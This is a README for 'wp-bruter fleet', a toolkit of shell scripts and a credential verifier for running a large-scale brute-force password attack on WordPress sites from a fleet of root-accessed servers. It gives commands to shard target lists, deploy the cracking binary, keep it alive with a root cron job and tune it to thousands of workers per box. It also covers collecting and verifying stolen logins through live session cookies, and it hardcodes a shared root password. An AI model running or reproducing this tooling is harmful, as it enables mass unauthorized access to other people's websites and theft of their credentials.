# wp-bruter fleet

Tools: `spread.sh`, `deploy.sh`, `farm.sh`, `watchdog.sh`, `monitor.sh`,
`tools/verify_creds.py`.

## Fleet

`fleet.txt` — one host per line, login `root` with password `fahrel`
(override: `WORKER_PASS`). Every script reads this file.

Shard index is tied to the line position, not to how many hosts answer: a dead
host keeps its shard and the next deploy resumes it. A host that does not answer
is skipped, the rest still deploy.

## Run a list

```
./spread.sh <drive-link-or-id>          # download, cache, shard, deploy
./spread.sh <drive-link-or-id> --fetch  # download only
./spread.sh --local lists/foo.txt       # deploy an already-downloaded file
./deploy.sh                             # deploy LOCAL_SITES (default wordpress.txt)
```

The Drive file is cached as `lists/<drive-id>.txt`, CR-stripped, trimmed,
deduplicated and URL-checked before any host is touched.

Deploy uploads the binary beside the running one and renames it, verifies the
checksum, keeps `progress.txt` while the shard is unchanged (wiped when the
shard content changes), removes shard files from an old fleet size and starts
`run.sh`.

## Shard lifecycle

`run.sh` walks the phase list once — `150` then `500` then `0` attempts — and
then touches `/opt/wp-bruter/done` and exits. It does not repeat on its own.

`progress.txt` is the resume ledger: rows that finished for good
(`verified_success`, `not_wordpress`, `candidates_exhausted`) are skipped on the
next run; retryable rows (`network_error`, `blocked`, `waf_*`, `attempt_limit`,
`slow`, `unavailable`, `rate_limited`) are retried by the later phases of the
same sweep.

A shard whose phases all returned is done until the next deploy. `deploy.sh`
clears the marker `done` so a redeploy always starts clean.

Add `-retry-failed=false` to the `wp-bruter` call in `run.sh` if even a
redeploy should skip retryable rows.

## Farm more per hour

A swept shard is mostly dead hosts and pre-flight burns 3 s on each, so the
workers rarely reach a target that answers. `farm.sh` rebuilds every shard from
the sites that ever answered (one URL per host, taken from `progress.txt`),
backs up the full shard to `/root/wordpress.full.sN`, wipes progress and
restarts the run.

```
./farm.sh
./farm.sh --dry-run      # counts only
```

It reads the shard index from `/opt/wp-bruter/shard.idx` (written by `run.sh`),
so it survives a fleet renumber. `MIN_LIVE` (default `200`) keeps the full
shard when a box has too little history.

Dead rows are still useful history — refill them by deploying the original list
again.

## Keep boxes alive

```
./watchdog.sh
```

Installs a 3-minute root cron per box that starts `run.sh` again when it is
absent **and** `done` is missing:

```
*/3 * * * * root cd /opt/wp-bruter && pgrep -f "^/bin/bash ./run[.]sh" >/dev/null || [ -f done ] || nohup ./run.sh $(cat shard.idx 2>/dev/null || echo 0) >> attack.log 2>&1
```

## Stop

Watchdog revives within three minutes, so kill the cron first:

```
# 1. remove the watchdog everywhere
for ip in $(cat fleet.txt); do
  sshpass -p fahrel ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no root@$ip 'rm -f /etc/cron.d/wp-bruter'
done

# 2. stop the runner and the binary
for ip in $(cat fleet.txt); do
  sshpass -p fahrel ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no root@$ip \
    'pkill -f "^/bin/bash ./run[.]sh"; sleep 2; pkill -9 -x wp-bruter; pgrep -cx wp-bruter'
done
```

Graceful alternative to the `-9`: `pkill -TERM -x wp-bruter`, wait 15 s, then
`pkill -9`. In-flight requests are already recorded in `progress.txt`.

## Resume

```
./deploy.sh                                             # fresh shard, done cleared
./spread.sh --local lists/<file>.txt
./farm.sh                                               # back to the live subset
./watchdog.sh                                           # cron again (optional)
```

## Monitor

```
./monitor.sh
```

Per box: progress size, shard size, creds, results, outcome histogram,
BLOCKED/WAF/NET_ERR counters, log size, process state.

## Verify and collect

```
python3 tools/verify_creds.py --collect --ssh-pass fahrel
```

Collects `creds.txt` from every box, keeps only credentials whose login sets a
live `wordpress_logged_in_*` cookie, writes `.verified.txt` / `.unverified.txt`
beside the input and can push the verified file back to the fleet.

## State on a box (do not delete)

- `/opt/wp-bruter/progress.txt` — per-site offset, resume ledger
- `/opt/wp-bruter/creds.txt`, `results.txt` — findings
- `/opt/wp-bruter/shard.idx` — shard number, used by `farm.sh` and the cron
- `/root/wordpress.sN` — active shard, `/root/wordpress.full.sN` — full backup

## Tuning

| env | default | meaning |
| --- | --- | --- |
| `WORKERS_PER_BOX` | 4000 | global attempt workers |
| `ACTIVE_PER_BOX` | 8000 | concurrent sites |
| `PREP_PER_BOX` | 512 | pre-flight workers |
| `TIMEOUT` | 5 | request timeout, seconds |
| `PHASES` | `150 500 0` | attempts per pass |
| `LOCAL_SITES` | `wordpress.txt` | list to deploy |
| `LOCAL_PASS` | `pass.txt` | password list |
| `SWEEP_PAUSE` | — | unused, one sweep is the default |

Concurrency is the lever that raises pre-flight timeouts on big fleets: 800
workers gave ~20% network errors, 4000 gave ~50% on a busy box. Lower
`ACTIVE_PER_BOX`/`WORKERS_PER_BOX` if a box sits above load 4.

`run.sh` also raises `RLIMIT_NOFILE` to 262144, rotates `attack.log` at 100 MB
and retries a phase up to 5 times if the binary dies (fasthttp can still
panic).

## Known noise

- A 403 host is recorded `blocked`/`waf_cloudflare`; `-skip-waf` defaults to
  true so it is skipped on purpose.
- `network_error` is usually a transient DNS/TLS failure, not a dead site.
  The resolver drops packets during 8000-way bursts; retry the site or lower
  concurrency.
